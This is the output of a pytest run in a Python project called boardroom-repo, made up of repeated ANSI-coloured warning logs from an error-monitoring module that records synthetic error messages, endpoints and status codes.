============================= test session starts ==============================
platform linux -- Python 3.13.5, pytest-8.3.5, pluggy-1.5.0 -- /home/paul/boardroom-repo/.venv/bin/python
cachedir: .pytest_cache
rootdir: /home/paul/boardroom-repo
configfile: pyproject.toml
plugins: mock-3.14.0, langsmith-0.3.21, cov-6.2.1, Faker-37.4.0, xdist-3.8.0, anyio-4.9.0, asyncio-1.0.0, env-1.1.5
asyncio: mode=Mode.AUTO, asyncio_default_fixture_loop_scope=function, asyncio_default_test_loop_scope=function
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920546Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4324'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920597Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4325'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920647Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4326'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920695Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4327'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920744Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4328'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920793Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4329'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920840Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4330'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920887Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4331'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920934Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4332'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920981Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4333'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921029Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4334'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921078Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4335'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921130Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4336'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921184Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4337'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921240Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4338'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921296Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4339'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921349Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4340'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921401Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4341'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921452Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4342'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921501Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4343'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921551Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4344'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921601Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4345'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921651Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4346'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921699Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4347'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921748Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4348'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921796Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4349'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921844Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4350'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921901Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4351'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921953Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4352'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922003Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4353'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922068Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4354'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922162Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4355'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922275Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4356'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922356Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4357'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922419Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4358'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922471Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4359'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
